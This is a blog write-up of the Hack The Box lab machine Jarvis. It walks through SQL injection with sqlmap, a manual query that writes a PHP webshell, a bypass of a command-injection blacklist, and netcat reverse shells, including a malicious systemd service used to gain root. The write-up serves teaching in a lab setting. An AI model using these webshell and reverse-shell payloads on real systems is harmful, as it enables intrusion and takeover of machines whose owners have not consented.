@@ -1,0 +1,428 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Jarvis - Hack The Box</title>
+  <meta name="description" content="Resolution of the Jarvis machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Jarvis - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/jarvis">
+  <meta property="og:description" content="Resolution of the Jarvis machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/jarvis">
+  <meta name="twitter:title" content="Jarvis - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Jarvis machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/jarvis/jarvis-00-a45b9cf317a3cfe36b11a8127ea95125895bde7d1a63db444cce395a39a560c8.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/jarvis/jarvis-00-a45b9cf317a3cfe36b11a8127ea95125895bde7d1a63db444cce395a39a560c8.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Jarvis - Hack The Box</h1>
+            <p>Resolution of the Jarvis machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 18, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/jarvis/jarvis-00-a45b9cf317a3cfe36b11a8127ea95125895bde7d1a63db444cce395a39a560c8.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-00-a45b9cf317a3cfe36b11a8127ea95125895bde7d1a63db444cce395a39a560c8.png" alt="Jarvis banner" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-00-a45b9cf317a3cfe36b11a8127ea95125895bde7d1a63db444cce395a39a560c8.png" data-zooming-width="598" data-zooming-height="380">
+</a></p>
+
+<p>Jarvis is a medium level machine based on Linux, the initial process is based on <code class="highlighter-rouge">SQLi</code> and pretty easy. The privilege escalation stage requires basic <code class="highlighter-rouge">code review</code> skills and <code class="highlighter-rouge">Linux services</code> knowledge.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Mon Dec 30 09:19:52 2019 as: nmap -sV -sC -oA jarvis -T4 10.10.10.143</span>
+Nmap scan report <span class="k">for </span>10.10.10.143
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Stark Hotel
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Mon Dec 30 09:20:10 2019 -- 1 IP address (1 host up) scanned in 18.53 seconds</span></code></pre></figure>
+
+<p>Accessing the port 80 we noticed that the web application is a simple Hotel website.</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-01-9a9db3bfeef87021a359c89e1691d9a3786824701d60fdd6e6fa0a8e59509270.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-01-9a9db3bfeef87021a359c89e1691d9a3786824701d60fdd6e6fa0a8e59509270.png" alt="Jarvis Recon" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-01-9a9db3bfeef87021a359c89e1691d9a3786824701d60fdd6e6fa0a8e59509270.png" data-zooming-width="1247" data-zooming-height="545">
+</a></p>
+
+<p>Now let’s enumerate the web application with <a href="https://github.com/OJ/gobuster" target="_blank">gobuster</a></p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.143/
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/12/30 09:36:09 Starting gobuster
+<span class="o">===============================================================</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+/css <span class="o">(</span>Status: 301<span class="o">)</span>
+/fonts <span class="o">(</span>Status: 301<span class="o">)</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/phpmyadmin <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/12/30 09:36:44 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<h1 id="exploiting---exploiting-the-web-application-through-sql-injection-auto">Exploiting - Exploiting the web application through SQL Injection (auto)</h1>
+
+<p>After some time playing with the web application we noticed that the <code class="highlighter-rouge">cod</code> param is vulnerable to SQLi.
+The full URL is <code class="highlighter-rouge">http://10.10.10.143/room.php?cod=1</code></p>
+
+<p>So now we can exploit it with the tool named <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">sqlmap <span class="nt">-u</span> <span class="s2">"http://10.10.10.143/room.php?cod=1"</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-02-b9566632efa385425d59a411bcdbf08d9b503667b7c60bc8423e673109405afd.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-02-b9566632efa385425d59a411bcdbf08d9b503667b7c60bc8423e673109405afd.png" alt="Jarvis Exploiting" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-02-b9566632efa385425d59a411bcdbf08d9b503667b7c60bc8423e673109405afd.png" data-zooming-width="1280" data-zooming-height="492">
+</a></p>
+
+<p>Let’s try a shell spawn using the sqlmap module <code class="highlighter-rouge">os-shell</code>:</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-03-312b7510020304a43f2002b7b664e4b34cc9b0d83b9f8aa65d215798ac80282b.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-03-312b7510020304a43f2002b7b664e4b34cc9b0d83b9f8aa65d215798ac80282b.png" alt="Jarvis Exploiting" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-03-312b7510020304a43f2002b7b664e4b34cc9b0d83b9f8aa65d215798ac80282b.png" data-zooming-width="943" data-zooming-height="339">
+</a></p>
+
+<p>Done, now we have a shell as www-data.</p>
+
+<h1 id="exploiting---exploiting-the-web-application-through-sql-injection-manual">Exploiting - Exploiting the web application through SQL Injection (manual)</h1>
+
+<p>To exploit the web application using a manual approach we can set up a PHP webshell sending the following query:</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="o">-</span><span class="mi">5095</span><span class="o">%</span><span class="mi">20</span><span class="k">UNION</span><span class="o">%</span><span class="mi">20</span><span class="k">ALL</span><span class="o">%</span><span class="mi">20</span><span class="k">SELECT</span><span class="o">%</span><span class="mi">20</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="k">C</span><span class="o">?=</span><span class="nv">`$_GET[0]`</span><span class="o">?%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">22</span><span class="p">,</span><span class="k">NULL</span><span class="o">%</span><span class="mi">20</span><span class="k">into</span><span class="o">%</span><span class="mi">20</span><span class="n">OUTFILE</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">27</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell_nullarmor</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-04-bbd6d66f927958efd73e8f14705db6f0a89ee19c299eb73c5ea9a789995842bc.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-04-bbd6d66f927958efd73e8f14705db6f0a89ee19c299eb73c5ea9a789995842bc.png" alt="Jarvis Exploiting" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-04-bbd6d66f927958efd73e8f14705db6f0a89ee19c299eb73c5ea9a789995842bc.png" data-zooming-width="594" data-zooming-height="86">
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits the SQLi vulnerability and spawn an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/jarvis" target="_blank">Jarvis Exploit</a></p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-05-f5601e8a29155ad1a4a405d21419617474ab9b8391cb1623d1c70129859acb23.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-05-f5601e8a29155ad1a4a405d21419617474ab9b8391cb1623d1c70129859acb23.png" alt="Jarvis Exploit" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-05-f5601e8a29155ad1a4a405d21419617474ab9b8391cb1623d1c70129859acb23.png" data-zooming-width="729" data-zooming-height="224">
+</a></p>
+
+<h1 id="post-exploitation---escalating-privileges-through-multiple-users">Post Exploitation - Escalating privileges through multiple users</h1>
+
+<p>We have a shell session as www-data user so our privileges are pretty low. Doing a simple recon we found an interesting thing with <code class="highlighter-rouge">sudo -l</code>:</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-06-ba2d01865df1d9b4e9c654f46a7e595567f04234999ac5fe865aaff96191c879.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-06-ba2d01865df1d9b4e9c654f46a7e595567f04234999ac5fe865aaff96191c879.png" alt="Jarvis Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-06-ba2d01865df1d9b4e9c654f46a7e595567f04234999ac5fe865aaff96191c879.png" data-zooming-width="603" data-zooming-height="143">
+</a></p>
+
+<p>After doing a basic code review on <code class="highlighter-rouge">simpler.py</code> we noticed an <code class="highlighter-rouge">injection point</code> inside the <code class="highlighter-rouge">exec_ping</code> function:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
+    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s">'&amp;'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'||'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter an IP: '</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'Got you'</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span></code></pre></figure>
+
+<p>The vulnerable function has a blacklist or filter that contains some characters to avoid the command injection but it’s possible to bypass through the <code class="highlighter-rouge">$()</code> method.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="si">$(</span><span class="nb">command</span><span class="si">)</span></code></pre></figure>
+
+<p>For the exploitation we create a simple .sh file containing our reverse shell stager:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">nc <span class="nt">-e</span> /bin/bash 10.10.X.X 4445</code></pre></figure>
+
+<p>Then all we need to do is set up the netcat on listening mode and execute the vulnerable python script with sudo calling our malicious .sh file:</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-07-08e421347181baf00d02c1bc7d53eb9d6a718b2790524dc2a8eec089e2ade2a6.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-07-08e421347181baf00d02c1bc7d53eb9d6a718b2790524dc2a8eec089e2ade2a6.png" alt="Jarvis Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-07-08e421347181baf00d02c1bc7d53eb9d6a718b2790524dc2a8eec089e2ade2a6.png" data-zooming-width="551" data-zooming-height="376">
+</a></p>
+
+<p>It’s done, now we got a shell as pepper user and the first flag!</p>
+
+<p>The next step is escalate our privileges to root user, to do it we need to perform some recon and enumeration to find something new that we can see as pepper user. After a new enumeration using the tool named <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank">LinEnum</a> we found a vulnerable SUID binary named <code class="highlighter-rouge">systemctl</code>:</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-08-ae24ce602073683f52a6668e97a57c24655a343c51dab21d38a38253aa4f5089.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-08-ae24ce602073683f52a6668e97a57c24655a343c51dab21d38a38253aa4f5089.png" alt="Jarvis Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-08-ae24ce602073683f52a6668e97a57c24655a343c51dab21d38a38253aa4f5089.png" data-zooming-width="435" data-zooming-height="37">
+</a></p>
+
+<p>The systemctl is a software that manages services on Linux, with the sudo misconfiguration found with sudo -l we’re able to perform administration tasks with it.</p>
+
+<p>After a little research about privilege escalation using systemctl we found a great Medium article by Samuel Whang explaining how to perform a privilege escalation through a .service file and indexing it to be executed as root.</p>
+
+<p><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" target="_blank">Privilege Escalation: Systemctl (Misconfigured Permissions — sudo/SUID)</a></p>
+
+<p>Basically we create a .service file containing the following structure:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[Unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/nc -e /bin/bash 10.10.XX.XX 4446
+
+[Install]
+WantedBy=multi-user.target</code></pre></figure>
+
+<p>Saving it at our home directory, we set up a netcat on listening mode and enable/start our malicious service:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">/bin/systemctl <span class="nb">enable</span> /home/pepper/nullarmor.service
+/bin/systemctl start nullarmor</code></pre></figure>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-09-6f6724ca3bef082c1755368605b9f189c616229d8478630a90a0e82db0aeece6.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-09-6f6724ca3bef082c1755368605b9f189c616229d8478630a90a0e82db0aeece6.png" alt="Jarvis Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-09-6f6724ca3bef082c1755368605b9f189c616229d8478630a90a0e82db0aeece6.png" data-zooming-width="793" data-zooming-height="58">
+</a></p>
+
+<p>After that we receive a reverse connection as root, now we’re able to read the last flag!</p>
+
+<p><a href="/assets/hackthebox/jarvis/jarvis-10-4320f184db16d113bca9fadaa1f9db31edf371e9dd579691eb27cf3e2d2ef6c3.png">
+  <img src="/assets/hackthebox/jarvis/jarvis-10-4320f184db16d113bca9fadaa1f9db31edf371e9dd579691eb27cf3e2d2ef6c3.png" alt="Jarvis Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/jarvis/jarvis-10-4320f184db16d113bca9fadaa1f9db31edf371e9dd579691eb27cf3e2d2ef6c3.png" data-zooming-width="431" data-zooming-height="114">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Jarvis+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/jarvis%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/jarvis" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
